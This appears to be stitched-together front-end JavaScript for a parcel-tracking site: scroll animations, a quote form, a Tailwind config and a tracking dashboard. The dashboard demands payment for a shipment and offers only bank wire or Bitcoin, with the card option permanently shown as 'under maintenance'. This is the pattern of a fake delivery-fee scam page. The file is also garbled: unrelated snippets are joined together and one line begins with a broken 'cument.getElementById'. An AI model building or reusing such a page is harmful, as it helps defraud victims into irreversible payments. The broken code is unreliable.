async function checkTrack() {
    const code = document.getElementById('trackingInput').value;
    const resultBox = document.getElementById('resultBox');

    try {
        const response = await fetch(`http://localhost:3000/track/${code}`);
        const data = await response.json();

        if (response.ok) {
            resultBox.classList.remove('hidden'); 

            document.getElementById('info1').innerText = data.step1;
            document.getElementById('info2').innerText = data.step2;
            document.getElementById('info3').innerText = data.step3;
            document.getElementById('info4').innerText = data.step4;
            
            console.log("Timeline revealed!");
        } else {
            resultBox.classList.add('hidden');
            alert("Invalid Code");
        }
    } catch (error) {
        console.error("Connection failed");
    }
}

const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      entry.target.classList.add('active');
    }
  });
}, { threshold: 0.1 });



const lenis = new Lenis({
    duration: 1.2,
    easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
    orientation: 'vertical',
    gestureOrientation: 'vertical',
    smoothWheel: true,
});

lenis.on('scroll', ScrollTrigger.update);

gsap.ticker.add((time) => {
    lenis.raf(time * 1000);
});

gsap.ticker.lagSmoothing(0);

gsap.to(".reveal-image", {
    yPercent: -20, 
    ease: "none",
    scrollTrigger: {
        trigger: ".reveal-container",
        start: "top bottom", 
        end: "bottom top",  
        scrub: 2,  
    }
});

gsap.from(".reveal-text", {
    y: 100,
    opacity: 0,
    duration: 1.2,
    ease: "power4.out",
    scrollTrigger: {
        trigger: ".reveal-text",
        start: "top 90%",
    }
});


gsap.registerPlugin(ScrollTrigger);


const revealElements = document.querySelectorAll(".premium-reveal");

                revealElements.forEach((el) => {
                gsap.fromTo(el, 
                                { 
                opacity: 0, 
                y: 100,             
                scale: 0.95,       
                filter: "blur(5px)"
                }, 
                {
                opacity: 1,
                y: 0,
                scale: 1,
                filter: "blur(0px)",
                duration: 1.2,     
                ease: "power4.out",
                scrollTrigger: {
                    trigger: el,
                    start: "top 90%", 
                    toggleActions: "play none none reverse", 
                }
                }
            );
            });

        window.addEventListener("load", () => {
            const tl = gsap.timeline();

            tl.to(".premium-reveal", {
                opacity: 1,
                y: 0,
                scale: 1,
                filter: "blur(0px)",
                duration: 1.2,
                ease: "power4.out",
                stagger: 0.3,
    });
});



      cument.getElementById("quote-form").addEventListener("submit", async (e) => {
  e.preventDefault(); // This stops the "White Screen" refresh

  const form = e.target;
  const formData = new FormData(form);

  try {
    await fetch("/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(formData).toString(),
    });
    
    // Replace the button text to show success
    const btn = form.querySelector('button');
    btn.innerHTML = "Quote Sent Successfully!";
    btn.style.backgroundColor = "#10b981"; // Changes to Green
    form.reset(); // Clears the boxes
    
  } catch (error) {
    alert("Submission failed. Please check your internet.");
  }
});


/** @type {import('tailwindcss').Config} */
const plugin = require('tailwindcss/plugin')

module.exports = {
  content: ["./src/**/*.{html,js}"],
  theme: {
    extend: {
      // You can define colors here to use in your shadows later
      colors: {
        'brand-blue': '#001b3d', // Your Blue-950
      },
    },
  },
  plugins: [
    plugin(function ({ addUtilities }) {
      const newUtilities = {
        '.text-shadow': {
          textShadow: '0 2px 4px rgba(0,0,0,0.10)',
        },
        '.text-shadow-md': {
          textShadow: '0 4px 8px rgba(0,0,0,0.12)',
        },
        '.text-shadow-lg': {
          textShadow: '0 10px 20px rgba(0,0,0,0.25)',
        },
        '.text-shadow-none': {
          textShadow: 'none',
        },
      }
      addUtilities(newUtilities)
    }),
  ],
}


    async function handleTracking() {
    const input = document.getElementById('track-input').value.trim().toUpperCase();
    const target = document.getElementById('dashboard-target');
    const gate = document.getElementById('search-gate');

    try {
        const response = await fetch('status.json');
        const data = await response.json();

        if (input === data.trackingId) {
            gate.classList.add('hidden');
            const isPending = data.status.toLowerCase() === 'pending';

            // PREMIUM TIMELINE GENERATOR
            let historyHTML = "";
            data.history.forEach((step) => {
                const isActive = step.active === true;
                historyHTML += `
                <div class="relative pl-8 pb-10 group">
                    <div class="absolute left-[11px] top-0 bottom-0 w-[2px] bg-slate-800 group-last:bg-transparent"></div>
                    
                    <div class="absolute left-0 top-1 w-6 h-6 rounded-full border-4 border-slate-950 z-10 flex items-center justify-center 
                        ${isActive ? 'bg-green-500 shadow-[0_0_20px_rgba(59,130,246,0.5)]' : 'bg-slate-700'}">
                        <i class="fas ${step.type === 'truck' ? 'fa-truck' : 'fa-check'} text-[8px] text-white ${isActive ? 'animate-bounce' : ''}"></i>
                    </div>

                    <div class="bg-slate-900/40 border border-slate-800 p-5 rounded-2xl backdrop-blur-sm transition-all hover:border-blue-500/50">
                        <div class="flex justify-between items-start mb-2">
                            <h4 class="text-white font-bold text-lg">${step.desc}</h4>
                            <span class="text-[10px] font-mono text-slate-500 bg-black/30 px-2 py-1 rounded border border-white/5">${step.date}</span>
                        </div>
                        <div class="flex items-center text-slate-400 text-xs">
                            <i class="fas fa-location-dot mr-2 text-blue-500/70"></i>
                            <span class="uppercase tracking-widest text-[9px]">${step.location}</span>
                        </div>
                    </div>
                </div>`;
            });

            target.innerHTML = `
                <div class="bg-white p-8 rounded-[2.5rem] shadow-xl text-center mb-6">
                    <div class="w-16 h-16 ${isPending ? 'bg-orange-100 text-orange-500' : 'bg-green-100 text-green-500'} rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas ${isPending ? 'fa-wallet' : 'fa-check'} text-2xl"></i>
                    </div>
                    <h2 class="text-2xl font-black text-slate-900 leading-tight">${isPending ? 'Payment Required' : 'Shipment Secured'}</h2>
                    <p class="text-slate-400 text-[10px] font-bold uppercase mt-1 tracking-widest">${data.trackingId}</p>
                </div>

                <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100 mb-6">
                    ${isPending ? `
                        <h3 class="text-slate-400 font-bold uppercase text-[10px] tracking-[0.2em] mb-6 text-center">Select Payment Method</h3>
                        <div class="grid grid-cols-3 gap-3 mb-6">
                            <button onclick="togglePay('bank')" class="py-3 bg-slate-50 rounded-xl border border-slate-100 text-[10px] font-bold hover:bg-blue-50 transition-all">BANK</button>
                            <button onclick="togglePay('card')" class="py-3 bg-slate-50 rounded-xl border border-slate-100 text-[10px] font-bold hover:bg-blue-50 transition-all">CARD</button>
                            <button onclick="togglePay('btc')" class="py-3 bg-slate-50 rounded-xl border border-slate-100 text-[10px] font-bold hover:bg-blue-50 transition-all">BTC</button>
                        </div>
                        <div id="payment-details" class="p-5 bg-slate-900 rounded-2xl text-center">
                            <p class="text-slate-400 text-[10px] uppercase font-bold mb-2">Instructions</p>
                            <p class="text-white text-sm font-medium">Select a method above to view details</p>
                        </div>
                    ` : `
                        <div class="grid grid-cols-2 gap-8">
                            <div class="border-l-2 border-blue-500 pl-4">
                                <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">From</p>
                                <p class="text-slate-900 font-black text-sm">${data.sender}</p>
                            </div>
                            <div class="border-l-2 border-slate-200 pl-4">
                                <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">To</p>
                                <p class="text-slate-900 font-black text-sm">${data.receiver}</p>
                            </div>
                            <div class="col-span-2 bg-slate-50 p-4 rounded-2xl">
                                <p class="text-[9px] text-slate-400 font-bold uppercase mb-1 text-center">Final Destination</p>
                                <p class="text-slate-900 font-black text-center text-sm">${data.destination}</p>
                            </div>
                        </div>
                    `}
                </div>

                <div class="bg-slate-950 p-8 rounded-[2.5rem] shadow-2xl border border-white/5">
                    <div class="flex items-center justify-between mb-10">
                        <div class="flex flex-col">
                            <h3 class="text-white font-black text-xl tracking-tight">Live Location</h3>
                            <p class="text-blue-500 font-bold text-[9px] uppercase tracking-[0.3em]">GPS Synchronized</p>
                        </div>
                        <i class="fas fa-satellite-dish text-slate-800 text-2xl animate-pulse"></i>
                    </div>
                    
                    <div class="flex flex-col">
                        ${historyHTML}
                    </div>
                </div>
            `;
        }
    } catch (e) { console.error(e); }
}

// Global function to handle payment switching
function togglePay(method) {
    const box = document.getElementById('payment-details');
    fetch('status.json').then(r => r.json()).then(data => {
        if (method === 'bank') {
            box.innerHTML = `<p class="text-blue-400 text-[10px] font-bold uppercase mb-1">Wire Details</p><p class="text-white font-mono text-sm uppercase">${data.bankDetails}</p>`;
        } else if (method === 'card') {
            box.innerHTML = `<p class="text-blue-400 text-[10px] font-bold uppercase mb-1">Online Payment</p><p class="text-white text-sm">System Maintenance. Please use Bank Transfer Or Bitcoin.</p>`;
        } else if (method === 'btc') {
            box.innerHTML = `<p class="text-orange-400 text-[10px] font-bold uppercase mb-1">BTC Address</p><p class="text-white font-mono text-[10px] break-all">${data.btcAddress}</p>`;
        }
    });
}